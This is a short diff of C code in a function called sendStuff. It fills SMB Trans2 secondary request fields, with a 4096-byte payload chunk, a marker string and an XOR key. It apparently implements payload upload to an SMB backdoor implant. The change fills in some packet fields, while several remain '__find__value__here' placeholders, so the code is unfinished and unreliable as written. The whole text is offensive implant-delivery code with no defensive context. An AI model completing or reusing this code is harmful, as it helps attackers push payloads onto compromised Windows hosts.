@@ -101,17 +101,17 @@ int sendStuff()
       
       uploadpacket.ParamCountTotal = 1;
       uploadpacket.DataCountTotal = 0;
-      uploadpacket.ParamCountMax = __find__value__here
-      uploadpacket.DataCountMax = __find__value__here
-      uploadpacket.ParamCount = __find__value__here
-      uploadpacket.ParamOffset = __find__value__here
+      uploadpacket.ParamCountMax = 1;
+      uploadpacket.DataCountMax = 0;
+      uploadpacket.ParamCount = __find__value__here (parameter length)
+      uploadpacket.ParamOffset = 4096 + sizeof(SMB_TRANSACTION2_SECONDARY_REQUEST) + (1 * 2) - 4;
       uploadpacket.DataCount = 0;
       uploadpacket.DataOffset = __find__value__here
       uploadpacket.SetupCount = __find__value__here
       uploadpacket.SetupData = __find__value__here
       uploadpacket.function = 0x0e00;
       uploadpacket.byteCount = 4109;
-      memcpy(uploadpacket.SESSION_DATA_PARAMETERS, "GIBBERISH" , 8);
+      memcpy(uploadpacket.SESSION_DATA_PARAMETERS, "GIBERISH" , 8);
       memcpy(uploadpacket.SESSION_DATA_PARAMETERS + 8, CHAR_XOR_KEY, 4);
       memcpy(uploadpacket.payload, data, 4096);
 
